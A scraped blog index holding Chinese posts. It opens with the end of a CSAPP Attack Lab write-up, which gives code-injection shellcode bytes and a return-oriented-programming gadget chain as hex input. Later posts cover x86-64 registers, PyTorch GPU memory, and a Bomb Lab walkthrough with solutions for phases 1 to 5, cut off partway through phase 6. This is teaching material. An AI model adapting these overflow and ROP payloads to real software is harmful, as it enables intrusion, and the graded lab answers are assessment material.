由于touch3中调用了hexmatch和strncmp，有概率修改存放在getbuf栈中的数据，所以考虑将数据存放在test的栈中，再将该地址送入$rdi中。栈空间分配如下：\n查看test函数的栈空间：\n字符串需要写在地址0x5561dca8处。实际上这一位置也可以简单推算出：考虑到上一题需要写入的位置为0x5561dc78，则test应该写入的栈空间为0x5561dc78+40(getbuf开辟的栈空间)+8(因为调用函数而将返回地址压入栈空间)。最终的汇编如下：\n1 2 3  movq $0x5561dca8, %rdi pushq 0x4018fa ret   即：\n1 2 3 4  0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq   输入文件(不要忘记字符串末尾的结束符)：\n1 2 3 4 5 6 7 8  48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00   最终结果：\nPA 4 为了对抗上文中的code injection攻击，现代编译器做出了以下改进：\n  栈随机初始化，每次运行时的缓冲区地址不同。\n 考虑以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #include \u0026lt;stdio.h\u0026gt; void fun() { long local; printf(\u0026#34;local in fun: %p\\n\u0026#34;, \u0026amp;local); } int main() { long local; printf(\u0026#34;local in main: %p\\n\u0026#34;, \u0026amp;local); fun(); return 0; }   可以发现每次的运行结果不尽相同：\n   若$pc指向栈中的代码，触发segmentation fault。\n  因此，之前phase中的方法失效，我们只能利用已有的程序片断，而不是插入新的代码。我们要在已经给定的代码中找到特定的指令序列，这些序列以ret结尾，我们把这些命令叫做gadget。每一段gadget包含一系列指令字节，而且以ret（0xc3）结尾，跳转到下一个gadget，就这样连续的执行一系列的指令代码。\n我们可能无法执行我们原生的指令实现预期效果，但我们可以从已有指令的字节码中提取一部分，以构造目标指令。我们将含有gadget指令的farm.c进行反汇编：\n1 2  $ gcc -c -Og farm.c $ objdump -d farm.o \u0026gt; farm.s   PA 4的目标和PA 2的相同，但我们现在需要使用已有的指令拼凑出这些指令，而不是直接注入指令。首先我们要实现将参数传入$rdi的要求，考虑以下两种实现方案popq $rdi; retq（5f [90] c3）和movq \u0026lt;\u0026gt;, $rdi; retq（48 89 xx [90] c3），在汇编代码中进行搜寻：\n经过排查可以知道第一种方案不符合要求（因为不在gadget内），第二种方法可行，其对应的指令为movq $rax, $rdi; retq。由于cookie的值是写在栈上的，所以我们需要将栈上的值先传给$rax，再传给$rdi。这样我们就需要寻找popq $rax; retq（58 [90] c3）指令了：\n 这里需要特别注意的是，两条指令之间可以插入若干条nop（90），不影响执行效果。\n 这样，在getbuf返回之后，总的调用逻辑如下：\n1 2 3 4 5  popq $rax nop retq movq $rax, $rdi retq   可视化这一过程：\n这里关注一下两个gadget的地址情况：\n1 2  4019a0:\t8d 87 | 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax # movq 4019ca:\tb8 29 | 58 90 c3 mov $0xc3905829,%eax # popq   所以实际的指令地址应该设计为0x4019a2和0x4019cc。构造字节序列：\n1 2 3 4 5 6 7 8 9  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 \u0026lt;- 栈顶%rsp 填入数据0x4019cc fa 97 b9 59 00 00 00 00 \u0026lt;- popq指令返回给%rax寄存器的数据 a2 19 40 00 00 00 00 00 \u0026lt;- retq返回到的地址(movq指令首地址) ec 17 40 00 00 00 00 00 \u0026lt;- retq指令返回到touch2函数   结果：\nPA 5 作者说PA 5是一个附加问题，因为时间问题就暂时搁置了\u0026hellip;\nReference CSAPP Attack Lab\nCSAPP实验之attack lab\n《深入理解计算机系统/CSAPP》Attack Lab\n","date":"2023-02-14T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/csapp/03-attacklab/","title":"03-attacklab"},{"content":"寄存器 通用寄存器 x86-64有16个通用寄存器，每个寄存器都有8个字节，因此可以存储64位的值。寄存器的名称是rax、rbx、rcx、rdx、rsi、rdi、rbp、rsp、r8、r9、r10、r11、r12、r13、r14和r15。\n %rax 作为函数返回值使用。 %rsp 栈指针寄存器，指向栈顶。 %rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数\u0026hellip; %r10，%r11 用作调用者保存。 %rbx，%rbp，%r12，%r13，%14，%15 用作被调用者保存。   什么是调用者（caller）和被调用者（callee）？如果函数binky调用winky，我们把binky称为调用者，winky称为被调用者。例如，(1)和(3)都是被调用者的。被调用者可以自由地使用这些寄存器，覆盖现有的值而不采取任何预防措施，如果这些寄存器持有一个调用者想要保留的值，调用者必须在进行调用之前将该值复制到一个“安全”的位置；相反，如果被调用者打算使用调用者拥有的寄存器，它必须首先保留其值，并在退出调用前恢复它。\n 条件码寄存器 这些寄存器描述了最近的算术或逻辑操作的属性，可以检测这些寄存器来执行条件分支指令：\n CF (carry flag)：最近的算术操作是否产生了进位或借位。 ZF (zero flag)：最近的算术操作的结果是否为0。 SF (sign flag)：最近的算术操作的结果是否为负数。 OF (overflow flag)：最近的算术操作是否导致溢出。  GDB ","date":"2023-02-14T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/csapp/csapp-preliminaries/","title":"csapp preliminaries"},{"content":"组成 PyTorch中显存的占用通常分为5个部分：\n  PyTorch context：只要把任何东西放在GPU中，就一定会占用一定数量的显存（视版本的不同有变化）。\nhttps://stackoverflow.com/questions/43244645/what-is-a-cuda-context\n  model parameters\n  gradients\n  optimizer states\n  intermediate activations\n  其中intermediate activations占绝对大头，optimizer states的显存使用量大约为model parameters的整数倍（Adam:2, SGD:1）\n机制 在分析torch的显存占用时不能使用nvidia-smi，PyTorch使用缓存分配器来管理缓存分配，在缓存分配器的机制下, 一个Tensor就算被释放了，进程也不会把空闲出来的显存还给GPU，而是等待下一个Tensor来填入这一片被释放的空间(即只要一个Tensor对象在后续不会再被使用，那么PyTorch就会自动回收该Tensor所占用的显存，并以缓冲区的形式继续占用显存，所以在nvidia-smi/gpustat中看到的显存并没有减少)。\n由上可知，这一指令不能准确地给出某一个时间点具体的Tensor占用的显存，而是显示的已经分配到的显存缓冲区和torch在创建cuda进程时所需开销的和。\nAPI 有3个API用于分析显存：\n torch.cuda.memory_allocated()：反馈当前进程中torch.Tensor所占用的GPU显存(注意是只包括torch.Tensor) torch.cuda.max_memory_allocated()：到调用函数为止所达到的最大的显存占用字节数 torch.cuda.memory_reserved()：当前进程所分配的显存缓冲区  大模型的优化 如果仔细观察传统推理时模型的代码，会发现其加载代码时的步骤如下：\n 用随机初始化的权重创建模型 从磁盘上加载模型的权重 在模型中加载这些权重  这一过程其实有很多不合理之处：创建模型时的随机权重是无用的，此后在载入checkpoint的state_dict之后，程序中实际存在双份权重。为了解决这一问题，详见instantiating-an-empty-model。\nhttps://huggingface.co/docs/accelerate/usage_guides/big_modeling\n而传统推理时的模型分发机制如下：\n 从模型中加载整个权重到单GPU上 将模型分发给不同GPU  我们能否在载入模型时就将其分发给不同的GPU？详见Loading weights。\nReference PyTorch显存机制分析\n","date":"2023-02-12T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/hardware-machine-learning/pytorch_gpu_memory/","title":"PyTorch 显存分析"},{"content":"Bomblab 首先通过以下指令得到可执行文件的汇编：\n1  objdump -d bomb \u0026gt; bomb.s   启动gdb进行debug，为了方便，我们将所有的字符串写在一个文件中，具体操作流程如下（按esc进入代码界面，按i进入调试界面）：\nPA 1 首先看一下main函数中调用phase_1的过程：\n1 2 3 4 5  400e2d:\te8 de fc ff ff callq 400b10 \u0026lt;puts@plt\u0026gt; 400e32:\te8 67 06 00 00 callq 40149e \u0026lt;read_line\u0026gt; 400e37:\t48 89 c7 mov %rax,%rdi 400e3a:\te8 a1 00 00 00 callq 400ee0 \u0026lt;phase_1\u0026gt; 400e3f:\te8 80 07 00 00 callq 4015c4 \u0026lt;phase_defused\u0026gt;   回忆$rax存储函数返回值，$rdi存储函数的第一个参数。根据上下文可知这里传递的是字符串，我们可以通过实时查看汇编确认这一点：\n此后我们再查看phase_1的汇编：\n1 2 3 4 5 6 7 8 9  0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi 400ee9:\te8 4a 04 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; 400eee:\t85 c0 test %eax,%eax 400ef0:\t74 05 je 400ef7 \u0026lt;phase_1+0x17\u0026gt; 400ef2:\te8 43 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400ef7:\t48 83 c4 08 add $0x8,%rsp 400efb:\tc3 retq   这里将输入的字符串$rsp作为第一个参数，$0x402400中的值传给$rsi($esi)作为第二个参数，后送入strings_not_equal进行比较，返回值存储在$rax($eax)中。如果不相等，函数不会跳转，从而调用explode_bomb函数，炸弹破解失败。关键是要找出$0x402400中的值：\n据此，第一题的答案为：\n1  Border relations with Canada have never been better.   PA 2 查看phase_2的汇编：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp 400efd:\t53 push %rbx 400efe:\t48 83 ec 28 sub $0x28,%rsp 400f02:\t48 89 e6 mov %rsp,%rsi 400f05:\te8 52 05 00 00 callq 40145c \u0026lt;read_six_numbers\u0026gt; 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; 400f10:\te8 25 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400f15:\teb 19 jmp 400f30 \u0026lt;phase_2+0x34\u0026gt; 400f17:\t8b 43 fc mov -0x4(%rbx),%eax 400f1a:\t01 c0 add %eax,%eax 400f1c:\t39 03 cmp %eax,(%rbx) 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; 400f20:\te8 15 05 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400f25:\t48 83 c3 04 add $0x4,%rbx 400f29:\t48 39 eb cmp %rbp,%rbx 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; 400f3c:\t48 83 c4 28 add $0x28,%rsp 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 retq   首先函数会调用read_six_numbers：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  000000000040145c \u0026lt;read_six_numbers\u0026gt;: 40145c:\t48 83 ec 18 sub $0x18,%rsp 401460:\t48 89 f2 mov %rsi,%rdx 401463:\t48 8d 4e 04 lea 0x4(%rsi),%rcx 401467:\t48 8d 46 14 lea 0x14(%rsi),%rax 40146b:\t48 89 44 24 08 mov %rax,0x8(%rsp) 401470:\t48 8d 46 10 lea 0x10(%rsi),%rax 401474:\t48 89 04 24 mov %rax,(%rsp) 401478:\t4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c:\t4c 8d 46 08 lea 0x8(%rsi),%r8 401480:\tbe c3 25 40 00 mov $0x4025c3,%esi 401485:\tb8 00 00 00 00 mov $0x0,%eax 40148a:\te8 61 f7 ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 40148f:\t83 f8 05 cmp $0x5,%eax 401492:\t7f 05 jg 401499 \u0026lt;read_six_numbers+0x3d\u0026gt; 401494:\te8 a1 ff ff ff callq 40143a \u0026lt;explode_bomb\u0026gt; 401499:\t48 83 c4 18 add $0x18,%rsp 40149d:\tc3 retq   首先观察到sscanf这个函数，之后看到$0x4025c3这个特殊的地址值，打印其值：\n这提示了我们的输入要求。那输入的6个值又被存放在哪里？\n在调用完毕read_six_numbers之后查看栈空间，可见最开始输入的数位于栈顶、其他依次向后排。输入的六个数是逆序入栈，第一个数最后入栈，为栈顶。\n再看比较部分的代码：\n1  400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp)   首先比较第一个值与1是否相等，如果不相等就会直接引爆炸弹，如果相等，执行以下语句：\n1 2  400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp   第一句将栈指针偏移，指向下一个数；第二句复制栈底值（用于判断何时结束循环）；跳转过后执行以下语句：\n1 2 3 4  400f17:\t8b 43 fc mov -0x4(%rbx),%eax 400f1a:\t01 c0 add %eax,%eax 400f1c:\t39 03 cmp %eax,(%rbx) 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt;   首先提取出$rbx的前一个值，复制给$eax，再将其乘2，再与当前的$rbx比较。可见比较的要求是后一个数是前一个数的2倍，直到6个数循环完毕。据此可以得到答案：\n1  1 2 4 8 16 32   PA 3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi 400f56:\tb8 00 00 00 00 mov $0x0,%eax 400f5b:\te8 90 fc ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 400f60:\t83 f8 01 cmp $0x1,%eax # 如果输入的值的数量大于1 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; # 跳转，进行正常比较 400f65:\te8 d0 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax 400f75:\tff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fad:\te8 88 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; 400fc4:\te8 71 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 400fc9:\t48 83 c4 18 add $0x18,%rsp 400fcd:\tc3 retq   PA3同样调用了scanf，打印$0x4025cf的值发现应该需要输入两个数：\n运行到cmpl $0x7,0x8(%rsp)这步时，查看栈上的值：\n这时栈顶的两个值恰好是我们的两个输入值。根据cmpl $0x7,0x8(%rsp) 可知，第一个值不能大于7；再根据之后的jmpq *0x402470(,%rax,8)可知，这里以$rax*8 + 0x402470为读地址，从内存中读出跳转目标。\n第一个值被赋给$rax，跳转的位置与$rax本身的值密切相关，有必要查看0x402470附近的值分布：\n这样就可以建立起$rax值和跳转地址之间的映射关系，而不同的跳转值又对应着不同的比较值，据此可以确定第二个输入值：\n   $rax jump address compare var     0 0x00400f7c 0xcf   1 0x00400fb9 0x137   2 0x00400f83 0x2c3   3 0x00400f8a 0x100   4 0x00400f91 0x185   5 0x00400f98 0xce   6 0x00400f9f 0x2aa   7 0x00400fa6 0x147    8个答案中任选一个即可。\n1  0 207   PA 4 PA 4的核心代码设计到两个部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  000000000040100c \u0026lt;phase_4\u0026gt;: 40100c:\t48 83 ec 18 sub $0x18,%rsp 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi 40101f:\tb8 00 00 00 00 mov $0x0,%eax 401024:\te8 c7 fb ff ff callq 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 401029:\t83 f8 02 cmp $0x2,%eax 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; 401035:\te8 00 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 40103a:\tba 0e 00 00 00 mov $0xe,%edx 40103f:\tbe 00 00 00 00 mov $0x0,%esi 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi 401048:\te8 81 ff ff ff callq 400fce \u0026lt;func4\u0026gt; 40104d:\t85 c0 test %eax,%eax 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; 401058:\te8 dd 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp 401061:\tc3 retq   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # $rdi，$rsi，$rdx，$rcx 0000000000400fce \u0026lt;func4\u0026gt;: 400fce:\t48 83 ec 08 sub $0x8,%rsp 400fd2:\t89 d0 mov %edx,%eax 400fd4:\t29 f0 sub %esi,%eax 400fd6:\t89 c1 mov %eax,%ecx 400fd8:\tc1 e9 1f shr $0x1f,%ecx 400fdb:\t01 c8 add %ecx,%eax 400fdd:\td1 f8 sar %eax 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2:\t39 f9 cmp %edi,%ecx 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx 400fe9:\te8 e0 ff ff ff callq 400fce \u0026lt;func4\u0026gt; 400fee:\t01 c0 add %eax,%eax 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; 400ff2:\tb8 00 00 00 00 mov $0x0,%eax 400ff7:\t39 f9 cmp %edi,%ecx 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi 400ffe:\te8 cb ff ff ff callq 400fce \u0026lt;func4\u0026gt; 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007:\t48 83 c4 08 add $0x8,%rsp 40100b:\tc3 retq   首先我们仍然需要输入两个值：\n在func4中，我们看到代码再一次调用了函数本身，说明这是一个递归函数。首先，根据上一题的经验，输入的两个值分别储存在0x8($rsp)中和0xc($rsp)中，据此可以定位判断输入是否合法的代码：\n1 2 3 4 5 6 7 8 9 10 11 12  401029:\t83 f8 02 cmp $0x2,%eax 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) # 和14比较 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; # 小于等于合法 401035:\te8 00 04 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; ... 401048: e8 81 ff ff ff callq 400fce \u0026lt;func4\u0026gt; # 调用函数 40104d:\t85 c0 test %eax,%eax 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) # 和0比较 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; # 相等则合法 401058:\te8 dd 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt;   据此可以直接判断出第一个数应该小于等于14，第二个数为0，而且func4的返回值一定为0。\n调用func_4时，寄存器使用情况如下：\n然后看func4，$rdi，$rsi，$rdx，$rcx，$r8，$r9这几个寄存器中出现的只有前4个，而只有前3个作为原数据，剩下1个是中间变量，而且整个函数没有出现$rax的更新，据此可以推断该函数的类型是void (int, int, int)。\n转写后的c代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  void func4(int x, int y, int z) { // x: $rdi y: $rsi, z: $rdx  int t = z; /* mov %edx,%eax */ y = t - y; /* sub %esi,%eax */ int k = t; /* mov %eax,%ecx */ k = k \u0026gt;\u0026gt; 31; /* shr $0x1f,%ecx */ t = t + k; /* add %ecx,%eax */ t = t \u0026gt;\u0026gt; 1; /* sar %eax */ k = t + y; /* lea (%rax,%rsi,1),%ecx */ if (x \u0026lt; k) /* cmp %edi,%ecx */ { z = k - 1; /* lea -0x1(%rcx),%edx */ func4(x, y, z); /* callq 400fce \u0026lt;func4\u0026gt; */ t *= 2; /* add %eax,%eax */ } else { t = 0; /* mov $0x0,%eax */ if (k \u0026lt; x) /* cmp %edi,%ecx */ { y = k + 1; /* lea 0x1(%rcx),%esi */ func4(x, y, z); /* callq 400fce \u0026lt;func4\u0026gt; */ t = 2 * t + 1; /* lea 0x1(%rax,%rax,1),%eax */ } } }   phase_4中考察的是$eax的值，我们只需要关心t的变化。注意到x和y分别是输入的两个值（y已经确定为0），而z是固定值14。显然递归的终止条件是k=x，此时t=0。我们不妨让func4只执行一次，简单计算可得x=7。于是得到最终答案：\n1  7 0   PA 5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx 401063:\t48 83 ec 20 sub $0x20,%rsp 401067:\t48 89 fb mov %rdi,%rbx 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071:\t00 00 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) 401078:\t31 c0 xor %eax,%eax 40107a:\te8 9c 02 00 00 callq 40131b \u0026lt;string_length\u0026gt; 40107f:\t83 f8 06 cmp $0x6,%eax 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; 401084:\te8 b1 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f:\t88 0c 24 mov %cl,(%rsp) 401092:\t48 8b 14 24 mov (%rsp),%rdx 401096:\t83 e2 0f and $0xf,%edx 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4:\t48 83 c0 01 add $0x1,%rax 4010a8:\t48 83 f8 06 cmp $0x6,%rax 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd:\te8 76 02 00 00 callq 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010c6:\te8 6f 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010d2:\tb8 00 00 00 00 mov $0x0,%eax 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5:\t00 00 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; 4010e9:\te8 42 fa ff ff callq 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 4010ee:\t48 83 c4 20 add $0x20,%rsp 4010f2:\t5b pop %rbx 4010f3:\tc3 retq   首先注意到__stack_chk_fail这个函数，说明栈中含有“金丝雀值”（当然，这一点和题目本身没有太大关系）。\n这一段要求字符串的长度必须是6：\n1 2 3 4  40107a:\te8 9c 02 00 00 callq 40131b \u0026lt;string_length\u0026gt; 40107f:\t83 f8 06 cmp $0x6,%eax 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; 401084:\te8 b1 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt;   随后在movzbl (%rbx,%rax,1),%ecx这一句中，\n1 2 3 4 5 6 7 8 9  40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f:\t88 0c 24 mov %cl,(%rsp) 401092:\t48 8b 14 24 mov (%rsp),%rdx 401096:\t83 e2 0f and $0xf,%edx 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4:\t48 83 c0 01 add $0x1,%rax 4010a8:\t48 83 f8 06 cmp $0x6,%rax 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt;   这段汇编实际上是一段循环，将其翻译为C代码：\n1 2 3 4 5 6 7 8 9  for (int i = 0; i \u0026lt; 6; i++) /* add $0x1,%rax */ /* cmp $0x6,%rax */ { // $rax: i $rbx: input $ecx: a  // $ecx和$cl是同一寄存器，$edx和$dl是同一寄存器  int a = input[i]; /* movzbl (%rbx,%rax,1),%ecx */ int b = a \u0026amp; 0xf /* and $0xf,%edx */ b = array[b]; /* movzbl 0x4024b0(%rdx),%edx */ // the address of array is 0x4024b0  narr[i] = b; /* mov %dl,0x10(%rsp,%rax,1) */ // 也就是说该字符串存储在距离栈顶0x10的位置上，随后在比较时也会在这个位置取 }   array数组如下：\n循环结束之后，查看$0x4024b0的值与所获得的字符串是否相同。目标字符串是：\n据此我们可以列出一个表来查找所有符合比较条件的值：\n   target val shift in array (input[i] \u0026amp; 0b1111) ascii of input[i]     f 9 41, 57, 73, 89   l 15 47, 63, 79, 95   y 14 46, 62, 78, 94   e 5 37, 53, 69, 85   r 6 38, 54, 70, 86   s 7 39, 55, 71, 87    之后从表格里排列组合即可，一个结果是：\n1  )/.%\u0026amp;\u0026#39;   PA 6 PA 6涉及到链表这一数据结构，略麻烦，直接给出汇编的解析吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88  00000000004010f4 \u0026lt;phase_6\u0026gt;: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp 401100:\t49 89 e5 mov %rsp,%r13 401103:\t48 89 e6 mov %rsp,%rsi 401106:\te8 51 03 00 00 callq 40145c \u0026lt;read_six_numbers\u0026gt; 40110b:\t49 89 e6 mov %rsp,%r14 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d 401114:\t4c 89 ed mov %r13,%rbp 401117:\t41 8b 45 00 mov 0x0(%r13),%eax 40111b:\t83 e8 01 sub $0x1,%eax 40111e:\t83 f8 05 cmp $0x5,%eax 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; 401123:\te8 12 03 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401128:\t41 83 c4 01 add $0x1,%r12d 40112c:\t41 83 fc 06 cmp $0x6,%r12d 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; 401132:\t44 89 e3 mov %r12d,%ebx 401135:\t48 63 c3 movslq %ebx,%rax 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; 401140:\te8 f5 02 00 00 callq 40143a \u0026lt;explode_bomb\u0026gt; 401145:\t83 c3 01 add $0x1,%ebx 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 